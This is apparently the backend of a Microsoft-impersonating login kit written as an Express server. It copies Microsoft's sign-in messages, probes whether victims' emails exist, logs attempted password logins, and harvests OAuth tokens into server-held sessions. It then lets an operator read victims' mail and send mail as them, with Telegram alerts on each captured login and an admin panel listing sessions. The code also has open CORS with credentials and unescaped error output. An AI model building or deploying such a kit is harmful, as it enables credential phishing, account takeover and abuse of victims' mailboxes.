const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Load environment variables from .env file
if (fs.existsSync('.env')) {
    const envFile = fs.readFileSync('.env', 'utf8');
    envFile.split('\n').forEach(line => {
        const [key, value] = line.split('=');
        if (key && value && !process.env[key]) {
            process.env[key] = value;
        }
    });
}

const { GraphAPIAuth } = require('./src/graph-api');
const VPSManagementBot = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 5000;

// Security configuration
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-' + Math.random().toString(36).substr(2, 24);

// Make admin token available globally for Telegram bot
global.adminToken = ADMIN_TOKEN;

// Initialize Telegram Bot
let telegramBot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN) {
        telegramBot = new VPSManagementBot();
        console.log('🤖 Telegram Bot initialized successfully');
    } else {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram Bot:', error.message);
}

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());

// Admin authentication middleware
function requireAdminAuth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || 
                  (req.query && req.query.token) || 
                  (req.body && req.body.token);

    if (!token || token !== ADMIN_TOKEN) {
        return res.status(401).json({ 
            error: 'Unauthorized access to admin endpoint',
            message: 'Valid admin token required'
        });
    }
    next();
}

app.use(express.static('public'));

// Store user sessions with Graph API auth and OAuth state tracking
const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
const oauthStates = new Map(); // state -> { sessionId, timestamp }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state

// Analytics tracking with persistent storage
const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');

// Load analytics from file
function loadAnalytics() {
    try {
        if (fs.existsSync(ANALYTICS_FILE)) {
            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
            const savedAnalytics = JSON.parse(data);
            console.log('📊 Loaded analytics from file:', savedAnalytics);
            return {
                totalLogins: savedAnalytics.totalLogins || 0,
                successfulLogins: savedAnalytics.successfulLogins || 0,
                failedLogins: savedAnalytics.failedLogins || 0
            };
        }
    } catch (error) {
        console.error('Error loading analytics:', error);
    }
    console.log('📊 Starting with fresh analytics data');
    return {
        totalLogins: 0,
        successfulLogins: 0,
        failedLogins: 0
    };
}

// Save analytics to file
function saveAnalytics() {
    try {
        fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
        console.log('💾 Analytics saved to file');
    } catch (error) {
        console.error('Error saving analytics:', error);
    }
}

// Initialize analytics from file
const analytics = loadAnalytics();

// Cleanup expired sessions and OAuth states
setInterval(() => {
    const now = Date.now();

    // Clean up expired sessions
    for (const [sessionId, session] of userSessions) {
        if (now - session.createdAt > SESSION_TIMEOUT) {
            userSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired session: ${sessionId}`);
        }
    }

    // Clean up expired OAuth states
    for (const [state, stateInfo] of oauthStates) {
        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            console.log(`🧹 Cleaned up expired OAuth state`);
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// Helper function to create session ID
function createSessionId() {
    return Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Microsoft Graph API Backend is running',
        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
    });
});

// Get OAuth authorization URL
app.post('/api/auth-url', (req, res) => {
    try {
        // Check if Azure credentials are configured
        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
            return res.status(500).json({
                error: 'Azure credentials not configured',
                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
            });
        }

        const sessionId = createSessionId();

        // Use fixed redirect URI from environment or construct carefully
        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;

        const graphAuth = new GraphAPIAuth({
            clientId: process.env.AZURE_CLIENT_ID,
            clientSecret: process.env.AZURE_CLIENT_SECRET,
            tenantId: process.env.AZURE_TENANT_ID,
            redirectUri: redirectUri
        });

        const authUrl = graphAuth.getAuthUrl(sessionId);

        // Extract state from URL for tracking
        const stateMatch = authUrl.match(/state=([^&]+)/);
        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;

        // Store session and state mapping
        userSessions.set(sessionId, {
            sessionId: sessionId,
            graphAuth: graphAuth,
            userEmail: null,
            createdAt: Date.now(),
            oauthState: state,
            authenticated: false, // Initialize as not authenticated
            verified: false // Initialize as not verified
        });

        if (state) {
            oauthStates.set(state, {
                sessionId: sessionId,
                timestamp: Date.now()
            });
        }

        analytics.totalLogins++;
        saveAnalytics();

        console.log(`🔑 Generated auth URL for session: ${sessionId}`);

        res.json({
            authUrl: authUrl,
            sessionId: sessionId,
            message: 'Click the URL to authenticate with Microsoft'
        });

    } catch (error) {
        console.error('Error generating auth URL:', error);
        res.status(500).json({ 
            error: 'Failed to generate auth URL',
            details: error.message 
        });
    }
});

// Handle OAuth callback
app.get('/api/auth-callback', async (req, res) => {
    try {
        const { code, state, error: authError } = req.query;

        if (authError) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Authentication failed',
                details: authError 
            });
        }

        if (!code || !state) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Missing authorization code or state parameter' 
            });
        }

        // Validate state and find associated session
        const stateInfo = oauthStates.get(state);
        if (!stateInfo) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Invalid or expired state parameter' 
            });
        }

        // Check state timeout (10 minutes)
        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'OAuth state expired' 
            });
        }

        const targetSession = userSessions.get(stateInfo.sessionId);
        if (!targetSession) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Associated session not found' 
            });
        }

        // Clean up OAuth state
        oauthStates.delete(state);

        // Exchange code for tokens
        const tokenData = await targetSession.graphAuth.getTokenFromCode(code);

        // Get user profile
        const userProfile = await targetSession.graphAuth.getUserProfile();
        targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
        targetSession.authenticated = true; // Mark session as authenticated

        analytics.successfulLogins++;
        saveAnalytics();

        console.log(`✅ User authenticated successfully`);

        // Send success response with redirect to frontend
        res.send(`
            <html>
                <head><title>Authentication Successful</title></head>
                <body>
                    <h2>✅ Authentication Successful!</h2>
                    <p>You can now close this window and return to the application.</p>
                    <script>
                        // Try to close the window, or redirect back to main app
                        setTimeout(() => {
                            window.close() || (window.location.href = '/');
                        }, 2000);
                    </script>
                </body>
            </html>
        `);

        // Send Telegram notification if bot is available (with minimal PII logging)
        if (telegramBot) {
            try {
                const domain = targetSession.userEmail.split('@')[1] || 'Unknown';
                await telegramBot.sendLoginNotification({
                    email: '***@' + domain, // Redact username part
                    domain: domain,
                    timestamp: new Date().toISOString(),
                    sessionId: targetSession.sessionId,
                    authMethod: 'Microsoft Graph API'
                });
                console.log(`📤 Telegram notification sent for user@${domain}`);
            } catch (error) {
                console.error('❌ Failed to send Telegram notification:', error.message);
            }
        }

    } catch (error) {
        console.error('Error in auth callback:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).send(`
            <html>
                <head><title>Authentication Failed</title></head>
                <body>
                    <h2>❌ Authentication Failed</h2>
                    <p>Error: ${error.message}</p>
                    <p><a href="/">Return to main page</a></p>
                </body>
            </html>
        `);
    }
});

// Get user profile
app.get('/api/profile', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);
        
        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }
        
        const userProfile = await session.graphAuth.getUserProfile();

        res.json({
            profile: userProfile,
            email: session.userEmail,
            sessionId: sessionId,
            verified: session.verified // Include verification status
        });

    } catch (error) {
        console.error('Error getting user profile:', error);
        res.status(500).json({ 
            error: 'Failed to get user profile',
            details: error.message 
        });
    }
});

// Get emails
app.get('/api/emails', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
        const count = parseInt(req.query.count) || 10;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }
        
        const emails = await session.graphAuth.getEmails(count);

        res.json({
            emails: emails,
            count: emails.length,
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error getting emails:', error);
        res.status(500).json({ 
            error: 'Failed to get emails',
            details: error.message 
        });
    }
});

// Send email
app.post('/api/send-email', async (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
        const { to, subject, body, isHtml = false } = req.body;

        if (!sessionId || !userSessions.has(sessionId)) {
            return res.status(401).json({ 
                error: 'No active session found',
                message: 'Please authenticate first' 
            });
        }

        const session = userSessions.get(sessionId);

        // Check if session is authenticated
        if (!session.authenticated) {
            return res.status(401).json({ 
                error: 'Session not authenticated',
                message: 'Please complete login first' 
            });
        }

        if (!to || !subject || !body) {
            return res.status(400).json({ 
                error: 'Missing required fields',
                message: 'to, subject, and body are required' 
            });
        }

        await session.graphAuth.sendEmail(to, subject, body, isHtml);

        res.json({
            success: true,
            message: 'Email sent successfully',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ 
            error: 'Failed to send email',
            details: error.message 
        });
    }
});

// Verify email endpoint
app.post('/api/verify-email', async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required',
                exists: false 
            });
        }

        // Extract domain from email
        const domain = email.split('@')[1];
        if (!domain) {
            return res.json({
                exists: false,
                email: email,
                message: "Please enter a valid email address."
            });
        }

        try {
            // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
            const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;
            
            const response = await fetch(discoveryUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'Microsoft-Graph-Auth-App'
                }
            });

            if (response.ok) {
                const data = await response.json();
                
                // Check if the account exists and is a valid Microsoft account
                // Microsoft accounts can have various AccountType values: Managed, Federated, Unknown, etc.
                console.log(`Raw Microsoft discovery response for ${email}:`, data);
                
                const isValidAccount = data.Account && (
                    data.Account === 'Managed' || 
                    data.Account === 'Federated' || 
                    data.NameSpaceType === 'Managed' ||
                    data.NameSpaceType === 'Federated' ||
                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com')) ||
                    (data.DomainName && data.DomainName.length > 0)
                );
                
                if (isValidAccount) {
                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.NameSpaceType})`);
                    
                    // Store verification result in session_data for tracking
                    const fs = require('fs');
                    const path = require('path');
                    const sessionDir = path.join(__dirname, 'session_data');
                    if (!fs.existsSync(sessionDir)) {
                        fs.mkdirSync(sessionDir, { recursive: true });
                    }
                    
                    const verificationId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                    const verificationData = {
                        id: verificationId,
                        email: email,
                        accountType: data.Account || data.NameSpaceType,
                        domain: domain,
                        timestamp: new Date().toISOString(),
                        status: 'verified',
                        fullResponse: data
                    };
                    
                    fs.writeFileSync(
                        path.join(sessionDir, `verified_${verificationId}.json`),
                        JSON.stringify(verificationData, null, 2)
                    );
                    
                    res.json({
                        exists: true,
                        email: email,
                        message: 'Account found. Please enter your password.',
                        accountType: data.Account || data.NameSpaceType
                    });
                } else {
                    console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                    console.log(`Discovery response:`, data);
                    
                    // Store invalid result
                    const fs = require('fs');
                    const path = require('path');
                    const sessionDir = path.join(__dirname, 'session_data');
                    if (!fs.existsSync(sessionDir)) {
                        fs.mkdirSync(sessionDir, { recursive: true });
                    }
                    
                    const invalidId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                    const invalidData = {
                        id: invalidId,
                        email: email,
                        reason: 'Account not found',
                        errorMessage: "We couldn't find an account with that username. Try another, or get a new Microsoft account.",
                        timestamp: new Date().toISOString(),
                        status: 'invalid',
                        fullResponse: data
                    };
                    
                    fs.writeFileSync(
                        path.join(sessionDir, `invalid_${invalidId}.json`),
                        JSON.stringify(invalidData, null, 2)
                    );
                    
                    res.json({
                        exists: false,
                        email: email,
                        message: "We couldn't find an account with that username. Try another, or get a new Microsoft account."
                    });
                }
            } else {
                throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
            }
            
        } catch (error) {
            console.log(`❌ Email verification error for: ${email} - ${error.message}`);
            
            // For network errors or API issues, we'll be conservative and reject
            res.json({
                exists: false,
                email: email,
                message: "We couldn't verify your account. Please check your email address and try again."
            });
        }

    } catch (error) {
        console.error('Error in email verification:', error);
        res.status(500).json({ 
            error: 'Email verification failed',
            exists: false,
            details: error.message 
        });
    }
});

// Password authentication endpoint (will fallback to OAuth)
app.post('/api/authenticate-password', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        // Since Microsoft Graph API requires OAuth, we can't directly authenticate with password
        // This endpoint will always redirect to OAuth flow for security reasons
        console.log(`Password authentication attempted for: ${email} - redirecting to OAuth`);
        
        res.json({
            success: false,
            error: 'password_required',
            message: 'Microsoft requires OAuth authentication. Redirecting to secure sign-in...',
            requiresOAuth: true
        });

    } catch (error) {
        console.error('Error in password authentication:', error);
        res.status(500).json({ 
            error: 'Authentication failed',
            success: false,
            details: error.message 
        });
    }
});

// Get session status
app.get('/api/status', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.query.sessionId;

    if (sessionId && userSessions.has(sessionId)) {
        const session = userSessions.get(sessionId);
        const isAuthenticated = !!(session.authenticated && session.userEmail);

        res.json({
            authenticated: isAuthenticated,
            userEmail: session.userEmail,
            sessionId: sessionId,
            sessionCount: userSessions.size,
            hasToken: !!session.graphAuth?.accessToken,
            verified: !!session.verified
        });
    } else {
        res.json({
            authenticated: false,
            sessionCount: userSessions.size,
            message: 'No active session'
        });
    }
});

// Admin endpoints
app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
    const sessions = Array.from(userSessions.values()).map(session => ({
        sessionId: session.sessionId,
        userEmail: session.userEmail,
        createdAt: new Date(session.createdAt).toISOString(),
        hasAuth: !!session.graphAuth.accessToken,
        authenticated: session.authenticated,
        verified: session.verified
    }));

    res.json({
        sessions: sessions,
        totalSessions: sessions.length,
        analytics: analytics
    });
});

// Admin endpoint to revoke session
app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
    const sessionId = req.params.sessionId;

    if (userSessions.has(sessionId)) {
        userSessions.delete(sessionId);
        res.json({ 
            success: true, 
            message: `Session ${sessionId} revoked` 
        });
    } else {
        res.status(404).json({ 
            error: 'Session not found' 
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');

    // Check Azure configuration
    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
        console.log('✅ Azure credentials configured - Graph API ready');
    } else {
        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
    }

    if (!telegramBot) {
        console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
    }
});